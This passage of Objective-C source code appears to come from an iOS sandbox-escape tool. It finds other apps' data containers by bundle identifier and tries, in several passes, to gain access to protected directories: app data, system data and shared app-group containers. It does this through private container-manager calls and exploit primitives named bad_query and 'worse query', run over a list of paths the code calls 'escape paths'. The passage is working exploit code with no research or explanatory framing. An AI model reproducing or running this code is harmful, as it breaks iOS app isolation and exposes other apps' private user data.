        if (entry->d_type != DT_DIR && entry->d_type != DT_UNKNOWN) continue;
        if (entry->d_name[0] == '.') continue;
        if (strlen(entry->d_name) < 32) continue;

        char metaPath[1200];
        snprintf(metaPath, sizeof(metaPath),
                 "%s/%s/.com.apple.mobile_container_manager.metadata.plist",
                 basePath, entry->d_name);

        NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:
            [NSString stringWithUTF8String:metaPath]];
        if (!plist) continue;

        NSString *identifier = plist[@"MCMMetadataIdentifier"];
        if ([identifier isEqualToString:targetBundleID]) {
            closedir(dir);
            char fullPath[1200];
            snprintf(fullPath, sizeof(fullPath),
                     "/private/var/mobile/Containers/Data/Application/%s",
                     entry->d_name);
            return [NSString stringWithUTF8String:fullPath];
        }
    }
    closedir(dir);
    return nil;
}

NSString *FDDiscoverContainerPath(NSString *bundleID) {
    if (!bundleID || bundleID.length == 0) return nil;

    FDLog([NSString stringWithFormat:@"Discovering container for %@", bundleID]);

    // Pass 0: MCM class-2 direct query
    {
        static const uint64_t kFlagSets[] = { 0x900000000ULL, 0x8100000000ULL };
        for (int f = 0; f < 2; f++) {
            NSString *path = _queryContainerPath(2, bundleID, NO, kFlagSets[f]);
            if (path.length > 0 && path.isAbsolutePath) return path;
        }
    }

    // Pass 0b: MCM enumeration check
    {
        NSArray<NSString *> *ids = _enumerateIdentifiers(2, 500);
        if ([ids containsObject:bundleID]) {
            NSString *path = _queryContainerPath(2, bundleID, NO, 0x900000000ULL);
            if (path.length > 0) return path;
        }
    }

    // Grant access to parent containers directory
    _worseQuerySymlink("/private/var/mobile/Containers/Data/Application");
    _worseQueryGrant("/private/var/mobile/Containers/Data/Application", "fd-discover");

    static const char *kDirs[] = {
        "/private/var/mobile/Containers/Data/Application",
        "/var/mobile/Containers/Data/Application",
    };

    // Pass 1: try scanning without extra grants
    for (int i = 0; i < 2; i++) {
        NSString *found = _scanContainerDir(kDirs[i], bundleID);
        if (found) return found;
    }

    // Pass 2: grant via bad_query and scan
    for (int i = 0; i < 2; i++) {
        int64_t h = bad_query((char *)kDirs[i], true, NULL, false);
        if (h >= 0) {
            NSString *found = _scanContainerDir(kDirs[i], bundleID);
            if (found) return found;
        }
        const char **rtGroups; int rtGroupCount;
        _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
        for (int g = 0; g < rtGroupCount; g++) {
            h = bad_query((char *)kDirs[i], true, (char *)rtGroups[g], false);
            if (h >= 0) {
                NSString *found = _scanContainerDir(kDirs[i], bundleID);
                if (found) return found;
            }
        }
    }

    FDLog([NSString stringWithFormat:@"Container not found for %@", bundleID]);
    return nil;
}

#pragma mark - FDContainerEngineInit

int FDContainerEngineInit(void) {
    FDLog(@"Initializing container engine...");
    _diagReset();

    static const char *kEscapePaths[] = {
        "/private/var/mobile/Containers/Data/Application",
        "/private/var/mobile/Containers/Data/System",
        "/private/var/mobile/Containers/Shared/AppGroup",
        "/private/var/mobile/Containers/Shared/SystemGroup",
    };
    int n = sizeof(kEscapePaths) / sizeof(kEscapePaths[0]);
    int granted = 0;

    // Pass 1: WQ-SYM on all paths (primary for iOS 27+)
    for (int i = 0; i < n; i++) {
        int64_t h = _worseQuerySymlink(kEscapePaths[i]);
        if (h >= 0) {
            granted++;
            _diagAppend("init-sym: %s OK | ", kEscapePaths[i]);
            FDLog([NSString stringWithFormat:@"init WQ-SYM OK: %s h=%lld",
                   kEscapePaths[i], (long long)h]);
        } else {
            FDLog([NSString stringWithFormat:@"init WQ-SYM FAIL: %s rc=%lld",
                   kEscapePaths[i], (long long)h]);
        }
    }

    // Pass 2: WQ partDomain for paths not yet accessible
    for (int i = 0; i < n; i++) {
        int fd = open(kEscapePaths[i], O_RDONLY | O_DIRECTORY | O_CLOEXEC);
        if (fd >= 0) { close(fd); continue; }
        int64_t h = _worseQueryGrant(kEscapePaths[i], "fd-init");
        if (h >= 0) {
            granted++;
            _diagAppend("init-pd: %s OK | ", kEscapePaths[i]);
            FDLog([NSString stringWithFormat:@"init WQ-PD OK: %s h=%lld",
                   kEscapePaths[i], (long long)h]);
        }
    }

    // Pass 3: MCM class-7 app group activation for paths still not accessible
    {
        const char **rtGroups; int rtGroupCount;
        _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
        MCMAPI *api = FDGetAPI();
        if (api->queryCreate && api->querySetGroupIdentifiers && api->objectActivate) {
            for (int i = 0; i < n; i++) {
                int fd = open(kEscapePaths[i], O_RDONLY | O_DIRECTORY | O_CLOEXEC);
                if (fd >= 0) { close(fd); continue; }
                bool got = false;
                for (int g = 0; g < rtGroupCount && !got; g++) {
                    static const uint64_t kC7Flags[] = { 0x900000000ULL, 0x8100000000ULL };
                    for (int fi = 0; fi < 2 && !got; fi++) {
                        void *q = api->queryCreate();
                        if (!q) continue;
                        api->querySetClass(q, 7);
                        xpc_object_t xid = xpc_string_create(rtGroups[g]);
                        api->querySetGroupIdentifiers(q, xid);
                        api->querySetFlags(q, kC7Flags[fi]);
                        if (api->querySetPart) api->querySetPart(q, 0);
                        void *res = api->queryGetSingle(q);
                        if (res && api->objectCopy) {
                            void *act = api->objectCopy(res);
                            if (act) {
                                char *token = api->objectCopyToken ? api->objectCopyToken(act) : NULL;
                                bool activated = false;
                                if (token && token[0] != '\0')
                                    activated = api->objectActivate(act, false);
                                free(token);
                                if (activated) {
                                    fd = open(kEscapePaths[i], O_RDONLY | O_DIRECTORY | O_CLOEXEC);
                                    if (fd >= 0) {
                                        close(fd);
                                        granted++;
                                        _storeLease(api, q, act, rtGroups[g], kEscapePaths[i]);
                                        xpc_release(xid);
                                        _diagAppend("init-c7: %s OK g[%d] | ", kEscapePaths[i], g);
                                        FDLog([NSString stringWithFormat:
                                            @"init MCM-C7 OK: g[%d] f=%d %s", g, fi, kEscapePaths[i]]);
                                        got = true;
                                        continue;
                                    }
                                }
                                if (api->objectFree) api->objectFree(act);
                            }
                        }
                        if (!got) {
                            xpc_release(xid);
                            api->queryFree(q);
                        }
                    }
                }
            }
        }
    }

    // Pass 4: bad_query fallback for paths still not accessible
    for (int i = 0; i < n; i++) {
        int fd = open(kEscapePaths[i], O_RDONLY | O_DIRECTORY | O_CLOEXEC);
        if (fd >= 0) { close(fd); continue; }
        int64_t h = bad_query((char *)kEscapePaths[i], true, NULL, false);
        if (h >= 0) {
            granted++;
            _diagAppend("init-bq: %s OK | ", kEscapePaths[i]);
            FDLog([NSString stringWithFormat:@"init BQ OK: %s h=%lld",
                   kEscapePaths[i], (long long)h]);
            continue;
        }
        const char **rtGroups; int rtGroupCount;
        _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
        for (int g = 0; g < rtGroupCount; g++) {
            h = bad_query((char *)kEscapePaths[i], true, (char *)rtGroups[g], false);
            if (h >= 0) {
                granted++;
                _diagAppend("init-bq-ag: %s OK | ", kEscapePaths[i]);
                FDLog([NSString stringWithFormat:@"init BQ-AG OK: %s g[%d]", kEscapePaths[i], g]);
                break;
            }
        }
    }

    // Verify what's actually accessible
    int accessible = 0;
    for (int i = 0; i < n; i++) {
        int fd = open(kEscapePaths[i], O_RDONLY | O_DIRECTORY | O_CLOEXEC);
        if (fd >= 0) {
            close(fd);
            accessible++;
            FDLog([NSString stringWithFormat:@"init VERIFY OK: %s", kEscapePaths[i]]);
        } else {
            FDLog([NSString stringWithFormat:@"init VERIFY FAIL: %s errno=%d", kEscapePaths[i], errno]);
        }
    }

    _diagAppend("init: granted=%d accessible=%d/%d", granted, accessible, n);
    FDLog([NSString stringWithFormat:@"Engine init DONE: granted=%d accessible=%d/%d",
           granted, accessible, n]);
    return accessible;
}

const char *FDLastDiagnostic(void) {
    return sDiag;
}
